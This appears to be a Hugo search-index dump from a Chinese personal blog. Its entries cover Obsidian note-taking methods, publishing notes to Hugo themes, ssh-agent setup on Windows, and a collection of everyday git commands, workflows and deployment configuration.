相关资料 除非 CommonMark 添加对 wikilink 的支持, hugo 可能永远都不会有 wikilink 了. Support wiki-style internal page links · Issue #3606 · gohugoio/hugo · GitHub 除了让 hugo 在渲染阶段支持 wikilink, 还可以再主题内进行 url 的处理,例如 obsidian发布hugo-quartz.但是这样的主题很少… ","date":"2023-06-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/:3:0","series":null,"tags":["blog","hugo"],"title":"让hugo支持wikilink","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%AE%A9hugo%E6%94%AF%E6%8C%81wikilink/#相关资料"},{"categories":["point"],"content":"logseq 是一款大纲型的笔记软件. 要点如下: 本地存储 支持 markdown 开源, 且开源 spa-publish ","date":"2023-06-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/logseq/:0:0","series":null,"tags":["point","logseq"],"title":"logseq","uri":"/posts/%E7%AC%94%E8%AE%B0/point/logseq/#"},{"categories":["point"],"content":"openssh 是 ssh 协议的开源实现.而 ssh 可以用来 建立远程连接, 文件传输. 表达时 openssh 和 ssh 通常是等价的. ","date":"2023-06-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/openssh/:0:0","series":null,"tags":["point","openssh"],"title":"openssh","uri":"/posts/%E7%AC%94%E8%AE%B0/point/openssh/#"},{"categories":["point"],"content":"ssh-agent 是 ssh 的一个代理软件. 用来保存秘钥, 方便你日常使用. 要点: Windows 通常自带了此服务 ","date":"2023-06-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/ssh-agent/:0:0","series":null,"tags":["point","ssh-agent"],"title":"ssh-agent","uri":"/posts/%E7%AC%94%E8%AE%B0/point/ssh-agent/#"},{"categories":["point"],"content":"git 是一个代码管理工具. 要点: 非常流行, 社区庞大 方便多人的协作办公 人人本地一份代码 ","date":"2023-06-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/git/:0:0","series":null,"tags":["point","git"],"title":"git","uri":"/posts/%E7%AC%94%E8%AE%B0/point/git/#"},{"categories":["point"],"content":"obsidian 是一个笔记软件. 要点: 本地离线, 安全保证 除同步,发布都免费 性能良好 插件丰富 社区活跃 使用 Prism 进行代码块渲染 ","date":"2023-06-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/obsidian/:0:0","series":null,"tags":["point","obsidian"],"title":"obsidian","uri":"/posts/%E7%AC%94%E8%AE%B0/point/obsidian/#"},{"categories":["point"],"content":" 快捷键 编辑 缩进 Ctrl/Cmd ] 或 tab 取消缩进 Ctrl/Cmd [ ","date":"2023-06-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/obsidian/:1:0","series":null,"tags":["point","obsidian"],"title":"obsidian","uri":"/posts/%E7%AC%94%E8%AE%B0/point/obsidian/#快捷键"},{"categories":["blog"],"content":"我的使用 [[笔记/point/git|git]] 操作代码. 而 git 的通信会用到 [[笔记/point/openssh|openssh]].openssh 为了保证安全. 提供了私钥和公钥. 其中私钥可以密码加密, 保证安全性. 所以我就加密了.导致了什么问题呢?每次我用到 git 的时候, 都提示我输入密码. 所以我今天就来配置 [[笔记/point/ssh-agent|ssh-agent]].","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git-openssh%E7%9A%84%E5%85%8D%E5%AF%86/","series":null,"tags":["openssh","git","ssh-agent","blog"],"title":"git-openssh的免密","uri":"/posts/%E7%AC%94%E8%AE%B0/git-openssh%E7%9A%84%E5%85%8D%E5%AF%86/"},{"categories":["blog"],"content":" 简介我的使用 git 操作代码. 而 git 的通信会用到 openssh. openssh 为了保证安全. 提供了私钥和公钥. 其中私钥可以密码加密, 保证安全性. 所以我就加密了.导致了什么问题呢? 每次我用到 git 的时候, 都提示我输入密码. 所以我今天就来配置 ssh-agent. 我暂时只用 windows, 所以下面主要是 windows 的配置. ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git-openssh%E7%9A%84%E5%85%8D%E5%AF%86/:1:0","series":null,"tags":["openssh","git","ssh-agent","blog"],"title":"git-openssh的免密","uri":"/posts/%E7%AC%94%E8%AE%B0/git-openssh%E7%9A%84%E5%85%8D%E5%AF%86/#简介"},{"categories":["blog"],"content":" 操作流程 启动 windows 的 服务 =\u003e启动 ssh 服务 添加秘钥 ssh-add C:\\Users\\你的用户名\\.ssh\\id_rsa # 输入密码后回车 Enter passphrase for C:\\Users\\你的用户名\\.ssh\\id_rsa: Identity added: C:\\Users\\你的用户名\\.ssh\\id_rsa (kentxxq) # 验证效果 ssh-add -l 3072 SHA256:xxxxxxxxxxxxxxxxxxxxxxxoooooo kentxxq (RSA) 进入终端,编辑 notepad $profile 配置文件 # 加入下面这一行 $env:GIT_SSH=\"C:\\Windows\\System32\\OpenSSH\\ssh.exe\" 终端有效果, 但 vscode 等等软件没有生效? 按照这个老哥的做法, 改全局变量吧 Git: Support git with private key password · Issue #13680 · microsoft/vscode · GitHub 重新打开终端, 这里有一些 git教程 可以给你测试验证 ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git-openssh%E7%9A%84%E5%85%8D%E5%AF%86/:2:0","series":null,"tags":["openssh","git","ssh-agent","blog"],"title":"git-openssh的免密","uri":"/posts/%E7%AC%94%E8%AE%B0/git-openssh%E7%9A%84%E5%85%8D%E5%AF%86/#操作流程"},{"categories":["blog"],"content":"这里用来记录一些我可能用到的 [[笔记/point/git|git]] 命令. 每次去网上搜集都很麻烦, 还需要验证. 而这里的命令都经过了我的验证..","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/","series":null,"tags":["git","blog"],"title":"git教程","uri":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介这里用来记录一些我可能用到的 git 命令. 每次去网上搜集都很麻烦, 还需要验证. 而这里的命令都经过了我的验证.. ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["git","blog"],"title":"git教程","uri":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 配置","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["git","blog"],"title":"git教程","uri":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/#配置"},{"categories":["blog"],"content":" config 配置~/.ssh/config 文件可以处理多种问题。 多个密钥，不同密钥服务于不同仓库/用户 github 的连接问题 ssh connect to host github.com port 22 connection timed out ，github官方也有对此说明 下面是一个示例 Host qs_codeup HostName codeup.aliyun.com IdentityFile ~/.ssh/2_rsa PreferredAuthentications publickey User kentxxq Host github.com HostName ssh.github.com Port 443 IdentityFile ~/.ssh/id_rsa PreferredAuthentications publickey User kentxxq 两个配置文件，对应你的 2 个账号 Port 参数可以让你从默认的 22 端口，改成连接 443 端口 使用了不同的密钥 ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["git","blog"],"title":"git教程","uri":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/#config-配置"},{"categories":["blog"],"content":" 相关内容 在windows上使用ssh-agent，让git免密ssh拉取 ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["git","blog"],"title":"git教程","uri":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/#相关内容"},{"categories":["blog"],"content":" 操作","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["git","blog"],"title":"git教程","uri":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/#操作"},{"categories":["blog"],"content":" 规范 commit feat: 新功能 (feature) update: 在 feat 内的修改 fix: 修补 bug docs: 文档 (documentation) style: 格式（不影响代码运行的变动) refactor: 重构 (即不是新增功能，也不是修改 bug 的代码变动) perf: 性能优化 (performance) test: 增加测试 thore: 构建过程或辅助工具的变动 ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["git","blog"],"title":"git教程","uri":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/#规范-commit"},{"categories":["blog"],"content":" 克隆与加速 # clone 特定tag或release git clone -b v111 xxx.git # 深度为1的clone git clone --depth 1 xxx.git # 代理克隆 git clone https://ghproxy.com/https://github.com/kentxxq/hugo.git # 私有仓库配合token使用. git clone https://user:your_token@ghproxy.com/https://ghproxy.com/https://github.com/kentxxq/hugo.git # 克隆大文件失败 git config --global core.compression 0 git config --global http.postBuffer 500M git config --global http.maxRequestBuffer 100M ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/:3:2","series":null,"tags":["git","blog"],"title":"git教程","uri":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/#克隆与加速"},{"categories":["blog"],"content":" 指定 key git clone git@codeup.aliyun.com:oiasjdoajsdo/仓库名.git --config core.sshCommand=\"ssh -i ~/.ssh/你的私有key\" ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/:3:3","series":null,"tags":["git","blog"],"title":"git教程","uri":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/#指定-key"},{"categories":["blog"],"content":" 仓库 remote # 添加remote git remote add gitea https://ken.kentxxq.com/admin1/learn-actions.git # 修改origin地址 git remote set-url origin https://github.com/kentxxq/hugo.git # 删除 git remote remove origin2 # 验证效果 git remote -v ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/:3:4","series":null,"tags":["git","blog"],"title":"git教程","uri":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/#仓库-remote"},{"categories":["blog"],"content":" 推送 # 所有 git push git tag 1.0.0 # 指定tag git push origin \u003ctag_name\u003e # 所有tag,不推荐 git push --tags ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/:3:5","series":null,"tags":["git","blog"],"title":"git教程","uri":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/#推送"},{"categories":["blog"],"content":" 清空记录 # 新分支 git checkout --orphan new_branch # 添加到暂存区 git add -A # 提交 git commit -am \"init\" # 删除原有的main git branch -D main # 重命名分支 git branch -m main # 强制推送 git push -f origin main ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/:3:6","series":null,"tags":["git","blog"],"title":"git教程","uri":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/#清空记录"},{"categories":["blog"],"content":" git 工作流常见模式 github-flow：一个主分支。hotfix 和 feature 合并过来就 ok。主分支发布。问题是我合并特性到了 master，发布到开发环境测试。这时候生产有 bug，我要修复。我不能简单从 master 拉出分支来修复。 git-flow：dev 和 master 是主分支。存在一个分支发布多个环境的情况，或者说需要通过 tag 方式来发布。而我通常用不同分支发布到不同环境。因此不用这种。 我使用的，其实是在 github-flow 上加了环境分支： dev 是主分支 4 个环境的长期分支，每个环境对应流水线发布。dev=\u003etest=\u003epre=\u003eprod feature：不一定立即合并，因为不一定上线。上线完成以后再删除。只会合并到 dev 小步快跑，避免代码在某环境节点停留时间长的情况。中间存在功能删减的情况，也要遵循从 dev 开始的流程。 hotfix 可以从 prod 拉取。然后快速修复回到 prod。然后合并到 dev 后删除。 另外一种方式: 在特性分支上开发新功能，同步机器之间的代码 合并到 main 自动触发流水线，验证测试环境 手动 tag，发版线上 ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/:4:0","series":null,"tags":["git","blog"],"title":"git教程","uri":"/posts/%E7%AC%94%E8%AE%B0/git%E6%95%99%E7%A8%8B/#git-工作流"},{"categories":["point"],"content":" kentxxq 这是我的个人网名. ken 日常可以叫 “can”, 不是 \" 坑 “! 名字的由来? 我以前给自己起网名, 然后发现 超人 的名字叫 kent. 而日常叫起来的话, 一般都会叫 ken. 但是我买不到这个域名. 一般来说品牌合作都类似 卧龙\u0026凤雏 或者 卧龙X凤雏. 我名字的缩写是 xq,于是就 “kentXxq”=“kentxxq”. 联系方式我:admin@kentxxq.com 配上自拍帅照一张 ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/kentxxq/:0:0","series":null,"tags":["point","kentxxq"],"title":"kentxxq","uri":"/posts/%E7%AC%94%E8%AE%B0/point/kentxxq/#"},{"categories":["blog"],"content":"这里是我在确定使用 [[笔记/point/obsidian|obsidian]] 记录笔记以后. 对比选择我的博客发布方案.之前我的博客和笔记内容是割裂的. 一直使用 vscode 编写博客, 然后 [[笔记/point/hugo|hugo]] 发布. 而现在我想重新组合我的工作流.","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88/","series":null,"tags":["obsidian","hugo","blog"],"title":"obsidian的发布方案","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88/"},{"categories":["blog"],"content":" 简介这里是我在确定使用 obsidian 记录笔记以后. 对比选择我的博客发布方案. 之前我的博客和笔记内容是割裂的. 一直使用 vscode 编写博客, 然后 hugo 发布. 而现在我想重新组合我的工作流. ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88/:1:0","series":null,"tags":["obsidian","hugo","blog"],"title":"obsidian的发布方案","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88/#简介"},{"categories":["blog"],"content":" 发布方案","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88/:2:0","series":null,"tags":["obsidian","hugo","blog"],"title":"obsidian的发布方案","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88/#发布方案"},{"categories":["blog"],"content":" 现状先说结果,我选的 HEIGE-PCloud/DoIt: A clean, elegant and advanced blog theme for Hugo..没有哪种方案是十全十美的, 于是我先确定了优先级. seo: 既然是发布系统. 那么发布出去最重要的就是 seo 优化了. 评论: 交流, 反馈都会直接帮助到内容, 重要性排名第二. ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88/:2:1","series":null,"tags":["obsidian","hugo","blog"],"title":"obsidian的发布方案","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88/#现状"},{"categories":["blog"],"content":" 方案对比 对比项 hugo-quartz hugo-doit 官方 publish #todo标签 无法过滤解析 🚫 无法过滤解析 🚫 支持 ✅ 支持预览页面 支持 wikilink 和普通 link, 但效果一般 ⚠️ 不支持 🚫 支持 ✅ 需要做的改动 obsidian 发布到 quartz ℹ️ 移动 static 文件夹并配置 staticDirc ℹ️ 不需要 ✅ markdown 正常 link 到 head 只能定位到 page⚠️ 通过 goldmark-wiki 支持 ⚠️ 支持 ✅ seo 6 分 10 分 10 分 评论 🚫 ✅ 🚫 在确定了使用 doit 后,其中最让我纠结的就是语法问题. 禁用 wikilink 语法 - 相对于根目录. 需要在主题内修改 md 链接的渲染. 检测到 md 结尾就绕过原有逻辑,去除 md 结尾, 加上 /posts/ 前缀. 禁用 wikilink 语法 - 相对于当前文件, 需要开启 uglyURLs, 同时将 md 改成 html 采用 wikilink 语法, 在我编写笔记的时候好用. 但是发布需要渲染成 uglyURLs. 且要改源码编译 hugo 加入 goldmark-wikilink. 同时改动 wikilink 的渲染逻辑 分析: 2 比 1 要好, 不是绕过原有逻辑, 而是在原有逻辑后加入判断. 同时有兼容性好. 任意 markdown 编辑器都通用 3 比较麻烦, 同时如果 #todo/笔记 ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88/:2:2","series":null,"tags":["obsidian","hugo","blog"],"title":"obsidian的发布方案","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88/#方案对比"},{"categories":["blog"],"content":" 发布脚本 # 设置源文件夹和目标文件夹的路径 # $sourceRootFolder = \"D:\\files\\posts\" # $targetRootFolder = \"D:\\code\\kentxxq.github.io\\content\\posts\" $sourceRootFolder = \"obsidian文档路径\" $targetRootFolder = \"博客路径\\content\\posts\" # 切换到目标文件夹 Set-Location -Path $targetRootFolder git pull Write-Host \"github拉取完成\" Get-ChildItem -Path $targetRootFolder | Remove-Item -Force -Recurse Write-Host \"已删除存在的内容\" # 需要拷贝的文件夹 $folders = @(\"笔记\", \"附件\", \"日记\") foreach ($folder in $folders) { Copy-Item -Path \"$sourceRootFolder\\$folder\" -Destination \"$targetRootFolder\\$folder\" -Recurse -Force } Write-Host \"文件拷贝完成\" Write-Host \"查看效果\" Get-ChildItem -Path $targetRootFolder git add -A git commit -am \"文章更新\" git push Write-Host \"推送完成\" ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88/:2:3","series":null,"tags":["obsidian","hugo","blog"],"title":"obsidian的发布方案","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E5%8F%91%E5%B8%83%E6%96%B9%E6%A1%88/#发布脚本"},{"categories":["blog"],"content":"这里介绍我如何使用 [[笔记/point/obsidian|obsidian]] 来记录, 多总结, 总思考. 让 obsidian 真正成为最后一个笔记软件. (除非有其他革命性的创造, ar? 植入芯片?)","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/","series":null,"tags":["obsidian","blog"],"title":"obsidian的方法论","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/"},{"categories":["blog"],"content":" 简介这里介绍我如何使用 obsidian 来记录, 多总结, 总思考. 让 obsidian 真正成为最后一个笔记软件. (除非有其他革命性的创造, ar? 植入芯片?) ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/:1:0","series":null,"tags":["obsidian","blog"],"title":"obsidian的方法论","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/#简介"},{"categories":["blog"],"content":" 目标这部分是因为我刷到的一个 b 站视频, 我很认同他的观点. 于是想要来实践. 内容 问题点 说明 目标层 目标不明, 迟早要停 运用我的知识, 创造价值. 系统层 体系太乱, 事倍功半 于是我用 obsidian 来进行知识的管理与更新,并且发布出去. 管理和发布都会是价值 行为层 习惯不好, 大旗必倒 定期的整理, 添加新的理解, 关联知识体系. 流程层 流程不畅, 必走不长 使用日记来快速记录, 减少负担. 其他效果留给行为层 基础层 基础不牢, 地动山摇 生活, 工作都会有知识点. 不断探索, 进取是根本. ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/:2:0","series":null,"tags":["obsidian","blog"],"title":"obsidian的方法论","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/#目标"},{"categories":["blog"],"content":" 信息流 RSS: 帮助个性化, 及时性 书籍: 深度且详尽. 研究特定主题, 建立基础认知 博客: 多任务场景收听. 增加便携性 信息的分类和作用 ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/:3:0","series":null,"tags":["obsidian","blog"],"title":"obsidian的方法论","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/#信息流"},{"categories":["blog"],"content":" 如何开始","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/:4:0","series":null,"tags":["obsidian","blog"],"title":"obsidian的方法论","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/#如何开始"},{"categories":["blog"],"content":" 开始日记用日记开始每天的笔记. 为什么我的记录越来越少? 因为我发现我要些一篇文章的时候, 需要了解非常透彻, 花费很多的时间. 所以我通过类似 logseq 的日记来开始每一天的协作. 每天都是一个新的开始. 不强制把写的内容记到日记中做双链. 减少无效, 无作用的日记, 减少负担. 或者说换一种形式, 一句话日记比流水账双链更有意义. 日记整理成笔记或 point, 无用的日记应该删除. 例如除了已完成的 todo 没有其他内容. 记录内容: Todo 任务, 不单独记录到一个文件中, 可以减少历史负担产生的干扰 一句话日记. 通过 tag 的方式收集记录 有意思的句子. 通过 tag 的方式收集记录 ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/:4:1","series":null,"tags":["obsidian","blog"],"title":"obsidian的方法论","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/#开始日记"},{"categories":["blog"],"content":" 日记的格式 --- tags: - journal - 标题名称 categories: - journal description: \"\u003c% tp.date.now(\"YYYY-MM-DD\") %\u003e 日记\" --- 输出 --- title: \"2023-06-25\" tags: - journal - date: 2023-06-25 lastmod: 2023-06-25 categories: - journal description: \"2023-06-25 日记\" --- 自己的内容... ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/:4:2","series":null,"tags":["obsidian","blog"],"title":"obsidian的方法论","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/#日记的格式"},{"categories":["blog"],"content":" 笔记的重要组成 - 点 (point)point 是我笔记中的最小原子. 名词就是一个点的最佳诠释, 例如: kentxxq 是我的网名. 这种别人不了解的东西, 就非常适合引用. 多种表达形式? Alias 的头就是用来链接, 别名链接。例如 point 名字叫 ios, 也可以别名 iOS. ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/:4:3","series":null,"tags":["obsidian","blog"],"title":"obsidian的方法论","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/#笔记的重要组成---点-point"},{"categories":["blog"],"content":" 点 (point) 的格式 --- tags: - point - \u003c% tp.file.title %\u003e categories: - point --- 输出 --- title: logseq tags: - point - logseq date: 2023-06-25 lastmod: 2023-06-26 categories: - point --- `logseq` 是一款大纲型的笔记软件. 通常只是很少的简介信息, 没有必要再进行 description. ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/:4:4","series":null,"tags":["obsidian","blog"],"title":"obsidian的方法论","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/#点-point-的格式"},{"categories":["blog"],"content":" 博客的格式 --- tags: - blog categories: - blog description: \"\" --- ## 简介 ## 内容 输出 --- title: git常用命令 tags: - git - 清空历史记录 - 克隆速度 date: 2023-06-21 lastmod: 2023-06-25 --- ## 简介 这里用来记录一些我可能用到的 [git](point/git.md) 命令. 每次去网上搜集都很麻烦, 还需要验证. 而这里的命令都经过了我的验证.. ## 内容 xxx 这里想要特别说明一下: 简介通常用于链接. 一篇文章中, 如果我高频使用了 git 这个词, 我并不希望所有的 git 都变成链接. 更新日志被我去掉了, 因为我觉得更新时间就已经代替了文章的时效性. 而日记又会关联到博客, 这样就有了单链. 而日志和博客之间, 没有必要变成双联. 也就减少了我的写作负担. ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/:4:5","series":null,"tags":["obsidian","blog"],"title":"obsidian的方法论","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/#博客的格式"},{"categories":["blog"],"content":" 黄金守则 Eat Your Own Dogfood 吃自己的狗食, 我需要时时刻刻用到我自己写的内容, 这样才能进步. 收集=\u003e整理=\u003e消化=\u003e输出. 必须要有输出! 输出来决定输入 para project 要做的项目 area 长期关注的内容 resources 要用的资源 archive 不再使用的笔记 囤积症老是把可能有用的记录下来, 可是很难兑现. 输入足够多, 你输出也会更给力 脑子里时刻有问题, 总会遇到解决办法. ","date":"2023-06-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/:5:0","series":null,"tags":["obsidian","blog"],"title":"obsidian的方法论","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E7%9A%84%E6%96%B9%E6%B3%95%E8%AE%BA/#黄金守则"},{"categories":["blog"],"content":"这里是用 [[笔记/point/obsidian|obsidian]] 发布到 [[point/hugo|hugo]] 的 quartz 主题详细操作步骤.","date":"2023-06-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/","series":null,"tags":["blog","hugo","obsidian"],"title":"obsidian发布hugo-quartz","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/"},{"categories":["blog"],"content":" 简介这里是用 obsidian 发布到 hugo 的 quartz 主题详细操作步骤. quartz 主题优点如下: 支持双链语法 有双链图 ","date":"2023-06-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/:1:0","series":null,"tags":["blog","hugo","obsidian"],"title":"obsidian发布hugo-quartz","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/#简介"},{"categories":["blog"],"content":" 操作步骤","date":"2023-06-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/:2:0","series":null,"tags":["blog","hugo","obsidian"],"title":"obsidian发布hugo-quartz","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/#操作步骤"},{"categories":["blog"],"content":" fork 代码库 访问 hugo 模板仓库 jackyzha0/quartz: 🌱 host your own second brain and digital garden for free (github.com) fork 仓库 git 克隆到本地 git clone https://github.com/YOUR-USERNAME/quartz ","date":"2023-06-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/:2:1","series":null,"tags":["blog","hugo","obsidian"],"title":"obsidian发布hugo-quartz","uri":"/posts/%E7%AC%94%E8%AE%B0/obsidian%E5%8F%91%E5%B8%83hugo-quartz/#fork-代码库"},{"categories":["blog"],"content":" 初始化动作 移除 content 内的所有内容 编辑 data/config.yaml 目录下 name: kentxxq enableRecentNotes: true GitHubLink: https://github.com/kentxxq/quartz description: \"kentxxq's digital garden\" page_title: \"🪴 kentxxq's digital garden\" links: - link_name: Blog link: https://www.kentxxq.com - link_name: GitHub link: https://github.com/kentxxq 编辑 config.toml baseURL = \"https://blog.kentxxq.com/\" ignoreFiles = [ \"/content/templates/*\", \"/content/private/*\", \"/content/附件/*.md\", ] 注释掉 .github/workflows/docker-publish.yaml 文件 .gitignore 过滤 private 文件夹 content/private 修改 layouts/partials/date-fmt.html 里的日志格式 {{if .Date}} {{.Date.Format \"2006-01-02\"}} {{else if .Lastmod}} {{.Lastmod.Format \"2006-01-02\"}} {{else}} Unknown {{end}} 修改 .github/workflows/deploy.yaml 文件 name: Deploy to GitHub Pages on: push: branches: - hugo jobs: deploy: runs-on: ubuntu-20.04 steps: - uses: actions/checkout@v2 with: fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Build Link Index uses: jackyzha0/hugo-obsidian@v2.20 with: index: true input: content output: assets/indices root: . - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: \"0.96.0\" extended: true - name: Build run: hugo --minify - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: ${{ secrets.GITHUB_TOKEN }} publish_dir: ./public publish_branch: master # deploying branch cname: blog.kentxxq.com # 先用blog来做测试 